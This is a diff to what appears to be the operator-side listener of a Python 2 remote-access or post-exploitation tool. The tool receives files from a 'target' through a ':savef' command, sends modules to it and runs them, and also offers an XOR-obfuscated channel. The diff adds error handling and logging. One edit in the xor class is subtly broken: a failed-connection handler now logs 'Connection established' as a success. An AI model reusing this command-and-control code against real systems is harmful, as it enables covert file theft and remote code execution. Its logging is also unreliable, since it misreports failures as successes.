@@ -51,10 +51,13 @@ class tcp:
             data = conn.recv(socksize)
         
             if data.startswith(":savef"):
-                getname = data.split(" ")
-                fname = getname[1]
-                core.logging.info("Saving %s from %s" % (fname, name))
-                self.download(fname, name)
+                try:
+                    getname = data.split(" ")
+                    fname = getname[1]
+                    core.logging.info("Saving %s from %s" % (fname, name))
+                    self.download(fname, name)
+                except IndexError:
+                    core.logging.error("No file provided for [:savef] command")
                 
             elif data == ("Complete"):
                 print "[+] Module transfer successful."
@@ -158,6 +161,7 @@ class tcp:
             global conn
             conn, addr = server.accept()
             print("New Connection!")
+            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
         except:
             print("[!] Connection error!")
             core.logging.error("Connection to %s failed." % name)
@@ -166,10 +170,13 @@ class tcp:
             data = conn.recv(socksize)
         
             if data.startswith(":savef"):
-                getname = data.split(" ")
-                fname = getname[1]
-                core.logging.info("Saving %s from %s" % (fname, name))
-                self.download(fname, name)
+                try:
+                    getname = data.split(" ")
+                    fname = getname[1]
+                    core.logging.info("Saving %s from %s" % (fname, name))
+                    self.download(fname, name)
+                except IndexError:
+                    core.logging.error("No filename provided for [:savef] command.")
                 
             elif data == ("Complete"):
                 print "[+] Module transfer successful."
@@ -308,17 +315,20 @@ class xor:
             core.logging.info("New connection established to %s" % name)
         except:
             print("[!] Connection error!")
-            core.logging.error("Connection to %s failed." % name)
+            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
         
         while True:
             data = xor(conn.recv(socksize), pin)
             
             if data.startswith(":savef"):
-                getname = data.split(" ")
-                fname = getname[1]
-                core.logging.info("Saved file %s from %s" % (fname, name))
-                self.download(fname, name)
-                
+                try:
+                    getname = data.split(" ")
+                    fname = getname[1]
+                    core.logging.info("Saved file %s from %s" % (fname, name))
+                    self.download(fname, name)
+                except IndexError:
+                    core.logging.info("No filename provided for [:savef] command.")
+
             elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
@@ -423,18 +433,23 @@ class xor:
             global conn
             conn, addr = server.accept()
             print("New Connection!")
+            core.logging.info("Connection to local listener established: %s, %s" % (conn, addr)) 
             self.handle(conn, name)
         except:
             print("[!] Connection error!")
+            core.logging.error("Listener failed to bind %s:%s" % (HOST, PORT))
             
         while True:
             data = xor(conn.recv(socksize), pin)
             
             if data.startswith(":savef"):
-                getname = data.split(" ")
-                fname = getname[1]
-                core.logging.info("Saved file %s from %s" % (fname, name))
-                self.download(fname, name)
+                try:
+                    getname = data.split(" ")
+                    fname = getname[1]
+                    core.logging.info("Saved file %s from %s" % (fname, name))
+                    self.download(fname, name)
+                except:
+                    core.logging.error("No filename provided for [:savef] command.")
                 
             elif data == ("Complete"):
                 print "[+] Module transfer successful."
